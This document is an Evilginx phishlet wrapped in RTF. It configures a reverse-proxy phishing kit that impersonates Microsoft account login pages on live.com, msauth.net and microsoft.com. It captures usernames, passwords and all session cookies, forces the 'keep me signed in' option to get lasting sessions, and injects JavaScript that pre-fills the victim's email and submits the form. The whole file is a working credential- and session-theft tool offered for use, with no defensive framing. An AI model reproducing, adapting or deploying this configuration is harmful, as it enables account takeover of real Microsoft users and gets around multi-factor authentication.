{\rtf1\ansi\ansicpg1252\cocoartf2822
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 author: '@An0nud4y'\
min_ver: '2.3.0'\
proxy_hosts:\
  - \{phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true\}\
  - \{phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false\}\
  - \{phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false\}  \
  - \{phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false\}  \
  - \{phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false\}\
  - \{phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false\}\
  - \{phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false\} \
  - \{phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false\}\
  \
sub_filters:\
  - \{triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
\
  - \{triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://\{hostname\}/', replace: 'https://\{hostname\}/', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
  - \{triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''\{domain\}'';', replace: '''\{domain\}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']\}\
\
\
auth_tokens:\
  - domain: '.login.live.com'\
    keys: ['MSPOK','.*,regexp']\
  - domain: '.live.com'\
    keys: ['.*,regexp']\
  - domain: '.microsoft.com'\
    keys: ['.*,regexp']\
  - domain: '.account.microsoft.com'\
    keys: ['.*,regexp']      \
auth_urls:\
  - '/'\
  - '/*'  \
  - '/auth'\
  - '/auth/*'\
credentials:\
  username:\
    key: 'login'\
    search: '(.*)'\
    type: 'post'\
  password:\
    key: 'passwd'\
    search: '(.*)'\
    type: 'post'\
\
force_post:\
  - path: '/ppsecure/post.srf'\
    search:\
      - \{key: 'login', search: '.*'\}\
      - \{key: 'passwd', search: '.*'\}\
    force:\
      - \{key: 'KMSI', value: 'on'\}\
    type: 'post'    \
login:\
  domain: 'login.live.com'\
  path: '/login.srf'\
\
js_inject:\
  - trigger_domains: ["login.live.com"]\
    trigger_paths: ["/login.srf"]\
    script: |\
      (function() \{\
        console.debug("[JS Inject] Starting...");\
\
\
       const savedQuery = sessionStorage.getItem("original_query");\
       const params = new URLSearchParams(savedQuery);\
       const email = params.get("email");\
\
       console.log(savedQuery, email);\
\
\
        if (!email) \{\
          console.warn("[JS Inject] No email parameter in URL.");\
          return;\
        \}\
\
        function injectEmailAndProceed(emailInput) \{\
          // Use native value setter\
          const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value')?.set;\
          if (nativeInputValueSetter) \{\
            nativeInputValueSetter.call(emailInput, email);\
          \} else \{\
            emailInput.value = email;\
          \}\
\
          // Dispatch input/change events\
          emailInput.dispatchEvent(new Event('input', \{ bubbles: true \}));\
          emailInput.dispatchEvent(new Event('change', \{ bubbles: true \}));\
          console.debug("[JS Inject] Email set:", email);\
\
          // Wait for and click the 'Next' button\
          const interval = setInterval(() => \{\
            const nextButton = document.querySelector('button[type="submit"][data-testid="primaryButton"]');\
            if (nextButton && !nextButton.disabled) \{\
              console.debug("[JS Inject] Clicking 'Next' button...");\
              nextButton.click();\
              clearInterval(interval);\
            \}\
          \}, 300);\
\
          // Stop checking after 10 seconds\
          setTimeout(() => clearInterval(interval), 10000);\
        \}\
\
        function waitForEmailInput() \{\
          const existingInput = document.querySelector('input[type="email"]');\
          if (existingInput) \{\
            injectEmailAndProceed(existingInput);\
            return;\
          \}\
\
          const observer = new MutationObserver(() => \{\
            const emailInput = document.querySelector('input[type="email"]');\
            if (emailInput) \{\
              observer.disconnect();\
              injectEmailAndProceed(emailInput);\
            \}\
          \});\
\
          observer.observe(document.body, \{\
            childList: true,\
            subtree: true,\
          \});\
\
          console.debug("[JS Inject] Waiting for email input field...");\
        \}\
\
        waitForEmailInput();\
      \})();}